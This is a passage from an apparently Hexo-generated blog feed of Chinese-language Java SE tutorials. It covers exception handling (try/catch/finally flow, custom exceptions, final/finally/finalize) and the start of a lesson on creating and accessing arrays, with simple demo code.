编写针对该异常的处理语句；<br>&#125;<br></code></pre></td></tr></table></figure><p><a name="e062b3a8"></a></p><h3 id="1-4-异常的捕获以及执行流程"><a href="#1-4-异常的捕获以及执行流程" class="headerlink" title="1.4 - 异常的捕获以及执行流程"></a>1.4 - 异常的捕获以及执行流程</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileNotFoundException;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  异常的捕获以及执行流程</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo03</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            System.out.println(<span class="hljs-string">&quot;a&quot;</span>);<br>            <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;./a.txt&quot;</span>);<br>            System.out.println(<span class="hljs-string">&quot;b&quot;</span>);<br>        &#125;<span class="hljs-keyword">catch</span> (FileNotFoundException e)&#123;<br>            e.printStackTrace();<br>            System.out.println(<span class="hljs-string">&quot;c&quot;</span>);<br>        &#125;<span class="hljs-keyword">finally</span> &#123;<br>            <span class="hljs-comment">//finally的语句块，表示无论异常是否发生都会执行的语句块</span><br>            System.out.println(<span class="hljs-string">&quot;d&quot;</span>);<br>        &#125;<br><br>        System.out.println(<span class="hljs-string">&quot;e&quot;</span>);<br><br>        <span class="hljs-comment">//当异常出现时的执行流程：a  c  d  e</span><br>        <span class="hljs-comment">//当异常未出现的执行流程：a  b  d  e</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>当上述代码没有发生异常时的执行流程是：a  b  d  e</p><p>当上述代码发生异常时的执行流程是:a  c  d  e</p><p>finally中通常编写无异常是否发生都应该执行的代码，因此通常来做善后处理，比如:关闭文件，断开数据库连接等操作</p><p><strong>注意事项</strong></p><p>当需要catch多种不同类型的异常时，切记晓得类型需要放在大的类型的上面</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileNotFoundException;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  当多catch中需要捕获多种异常类型时，小类型放上面</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo05</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;./aa.txt&quot;</span>);<br>            fis.close();<br>        &#125;<span class="hljs-comment">/* catch (FileNotFoundException e) &#123;</span><br><span class="hljs-comment">            e.printStackTrace();</span><br><span class="hljs-comment">        &#125; catch (IOException e)&#123;</span><br><span class="hljs-comment">            e.printStackTrace();</span><br><span class="hljs-comment">        &#125;*/</span> <span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-comment">//小的类型需要放在上面，大的类型需要放在下面</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="1-5-手动抛出异常"><a href="#1-5-手动抛出异常" class="headerlink" title="1.5 - 手动抛出异常"></a>1.5 - 手动抛出异常</h3><pre><code class="hljs">在某些特殊的场合中，对于出现的异常无法直接处理或者不便于处理时，就可以选择将异常转移给方法的调用者，这种形式就叫做异常的抛出。</code></pre><p><strong>语法格式：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">show</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException&#123;方法体&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileNotFoundException;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  异常的抛出</span><br><span class="hljs-comment"> * */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo06</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">show</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> FileNotFoundException &#123;<br>        <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;./a.txt&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            show();<br>        &#125; <span class="hljs-keyword">catch</span> (FileNotFoundException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br><br>        <span class="hljs-comment">//一旦异常抛到了主方法中时，建议将其进行捕获，原因如果将异常再次抛出则会抛给JVM，</span><br>        <span class="hljs-comment">// 会给JVM造成负担，导致程序运行效率的降低</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><pre><code class="hljs">在子类中，如果父类中被重写的方法抛出了异常，那么子类中重写的方法可以抛出更小的异常、一样的异常，不可以抛出更大的异常。</code></pre><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  子类中重写父类方法时可以排除的异常类型 父类</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo07</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">show</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException&#123;<br>        System.out.println(<span class="hljs-string">&quot;我是Demo07中的show方法&quot;</span>);<br>    &#125;<br>&#125;<br>--------------------------------------------------------<br><span class="hljs-keyword">import</span> java.io.FileNotFoundException;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  Demo07的子类</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo07Sub</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Demo07</span>&#123;<br>    <span class="hljs-comment">//子类可以抛出与父类相同的异常类型</span><br>    <span class="hljs-comment">/*@Override</span><br><span class="hljs-comment">    public void show() throws IOException &#123;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    &#125;*/</span><br><br>    <span class="hljs-comment">//子类可以抛出比父类更小的异常类型</span><br>    <span class="hljs-comment">/*@Override</span><br><span class="hljs-comment">    public void show() throws FileNotFoundException&#123;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    &#125;*/</span><br>    <span class="hljs-comment">//子类中不可以排除比父类更大的异常</span><br>   <span class="hljs-comment">/* @Override</span><br><span class="hljs-comment">    public void show() throws Exception&#123;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    &#125;*/</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="1-6-自定义异常"><a href="#1-6-自定义异常" class="headerlink" title="1.6 - 自定义异常"></a>1.6 - 自定义异常</h3><pre><code class="hljs">自定义异常类去继承于Exception类或其子类，提供两个版本的构造器。</code></pre><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  自定义异常类</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AgeException</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Exception</span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">AgeException</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-comment">//传递异常的原因</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">AgeException</span><span class="hljs-params">(String message)</span> &#123;<br>        <span class="hljs-built_in">super</span>(message);<br>    &#125;<br>&#125;<br>------------------------------------------<br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Student</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Student</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age)</span> &#123;<br>        setName(name);<br>        <span class="hljs-keyword">try</span> &#123;<br>            setAge(age);<br>        &#125; <span class="hljs-keyword">catch</span> (AgeException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> <span class="hljs-keyword">throws</span> AgeException &#123;<br>        <span class="hljs-comment">//设置年龄的范围，如果不满足要求，则直接创建异常并抛出</span><br>        <span class="hljs-keyword">if</span>(age &lt; <span class="hljs-number">0</span> || age &gt; <span class="hljs-number">150</span>)&#123;<span class="hljs-comment">//年龄不合理，则创建异常对象，并抛出</span><br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AgeException</span>(<span class="hljs-string">&quot;年龄不合理，请重新输入！&quot;</span>);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-comment">//年龄合理的部分，则直接赋值即可</span><br>            <span class="hljs-built_in">this</span>.age = age;<br>        &#125;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Student&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&quot;, age=&quot;</span> + age +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br>&#125;<br>------------------------------------------------------------<br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  自定义类的测试类</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo08</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Student</span> <span class="hljs-variable">stu</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>(<span class="hljs-string">&quot;Andy&quot;</span>, -<span class="hljs-number">18</span>);<span class="hljs-comment">//构造一个学生对象</span><br>        System.out.println(stu);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><a name="a910e165"></a></p><h3 id="1-7-final、finally、finalize的区别"><a href="#1-7-final、finally、finalize的区别" class="headerlink" title="1.7 - final、finally、finalize的区别"></a>1.7 - final、finally、finalize的区别</h3><table><thead><tr><th>方法名</th><th>说明</th></tr></thead><tbody><tr><td><code>final</code></td><td>修饰的变量不可被修改，方法不可被重写，类不可被继承</td></tr><tr><td><code>finally</code></td><td>异常处理机制中的一个关键字</td></tr><tr><td><code>finalize</code></td><td>垃圾收集器执行之前被调用的方法</td></tr></tbody></table><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  final、finally、finalize区别</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-comment">/*final*/</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo01</span> &#123;<span class="hljs-comment">//final修饰的类，表示不能被继承</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">static</span> <span class="hljs-type">String</span> <span class="hljs-variable">NAME</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Andy&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">show</span><span class="hljs-params">()</span>&#123;<span class="hljs-comment">//用final修饰的方法不可被重写</span><br>        System.out.println(<span class="hljs-string">&quot;我是被final修饰的方法&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">finalize</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Throwable &#123;<br>        System.out.println(<span class="hljs-string">&quot;我被调用了&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><span class="hljs-comment">//        NAME = &quot;Bob&quot;;//被final修饰的变量表示常量，不可被修改</span><br>        <span class="hljs-type">Demo01</span> <span class="hljs-variable">demo01</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Demo01</span>();<br>        demo01 = <span class="hljs-literal">null</span>;<br>        System.gc();<span class="hljs-comment">//启动垃圾收集器</span><br>    &#125;<br>&#125;<br>-------------------------------<br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  Demo01的子类</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo01Sub</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Demo01</span>&#123;<br>    <span class="hljs-comment">/*@Override</span><br><span class="hljs-comment">    public void show() &#123;</span><br><span class="hljs-comment">        super.show();</span><br><span class="hljs-comment">    &#125;*/</span><br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>技术文章</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JavaSe</tag>
      
      <tag>面向对象</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JavaSe基础---数组</title>
    <link href="/2020/05/01/JavaSe%E5%9F%BA%E7%A1%80---%E6%95%B0%E7%BB%84/"/>
    <url>/2020/05/01/JavaSe%E5%9F%BA%E7%A1%80---%E6%95%B0%E7%BB%84/</url>
    
    <content type="html"><![CDATA[<h2 id="1-数组"><a href="#1-数组" class="headerlink" title="1 - 数组"></a>1 - 数组</h2><h3 id="1-1-数组的概念"><a href="#1-1-数组的概念" class="headerlink" title="1.1 - 数组的概念"></a>1.1 - 数组的概念</h3><pre><code class="hljs">数组本质上就是在内存空间中申请一块连续的存储空间，用来记录多个类型相同的数据。</code></pre><h3 id="1-2-数组的创建"><a href="#1-2-数组的创建" class="headerlink" title="1.2 - 数组的创建"></a>1.2 - 数组的创建</h3><p><strong>定义方式</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">格式：  数据类型[] 数组名称 = <span class="hljs-keyword">new</span> 数据类型[数组的长度];<br><span class="hljs-type">int</span>[] arr = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">10</span>];<span class="hljs-comment">//定义了一个可以存储10个整数类型的数组</span><br></code></pre></td></tr></table></figure><p><strong>初始化方式</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">格式：  数据类型[] 数组名称 = &#123;成员<span class="hljs-number">1</span>，成员<span class="hljs-number">2</span>，成员<span class="hljs-number">3</span>，成员<span class="hljs-number">4.</span>....&#125;；<br><span class="hljs-type">int</span>[] arr = &#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">0</span>&#125;;<br></code></pre></td></tr></table></figure><p><strong>两种的结合方式</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span>[] arr = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0</span>,<span class="hljs-number">9</span>,<span class="hljs-number">8</span>,<span class="hljs-number">7</span>,<span class="hljs-number">6</span>,<span class="hljs-number">5</span>,<span class="hljs-number">4</span>,<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>&#125;;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Arrays;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  数组的创建</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo04</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">int</span>[] arr01 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">10</span>];<span class="hljs-comment">//定义了一个长度为10个数组来存储int类型的数据</span><br>        System.out.println(arr01);<span class="hljs-comment">//引用中存储的是对象的地址</span><br>        <span class="hljs-comment">//借助数组工具类中的toString方法打印数组中的内容</span><br>        System.out.println(Arrays.toString(arr01));<br><br>        <span class="hljs-comment">//初始化方式创建数组</span><br>        <span class="hljs-type">int</span>[] arr02 = &#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">0</span>&#125;;<span class="hljs-comment">//会根据定义数组的成员的个数来申请相对应的存储空间</span><br>        System.out.println(Arrays.toString(arr02));<br><br>        <span class="hljs-comment">//两种的结合方式</span><br>        <span class="hljs-type">int</span>[] arr03 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0</span>,<span class="hljs-number">9</span>,<span class="hljs-number">8</span>,<span class="hljs-number">7</span>,<span class="hljs-number">6</span>,<span class="hljs-number">5</span>,<span class="hljs-number">4</span>,<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>&#125;;<br>        System.out.println(Arrays.toString(arr03));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><a name="c14b7eb2"></a></p><h3 id="1-3-数组的访问与赋值"><a href="#1-3-数组的访问与赋值" class="headerlink" title="1.3 - 数组的访问与赋值"></a>1.3 - 数组的访问与赋值</h3><blockquote><p>访问与赋值时通过<strong>下标</strong>来确定位置的，下标范围0 ~ 数组的长度减1结束</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Arrays;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  数组的访问与赋值</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo05</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//定义的方式创建数组</span><br>        <span class="hljs-type">int</span>[] arr01 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">10</span>];<br>        <span class="hljs-comment">//数组中是存在默认值的</span><br>        System.out.println(<span class="hljs-string">&quot;数组中的默认值：&quot;</span> + Arrays.toString(arr01));<br>        <span class="hljs-comment">//数组的赋值,在访问以及赋值时，[]中表示的是下标的概念</span><br>        arr01[<span class="hljs-number">5</span>] = <span class="hljs-number">6</span>;<br>        arr01[<span class="hljs-number">8</span>] = <span class="hljs-number">9</span>;<br><br>        System.out.println(<span 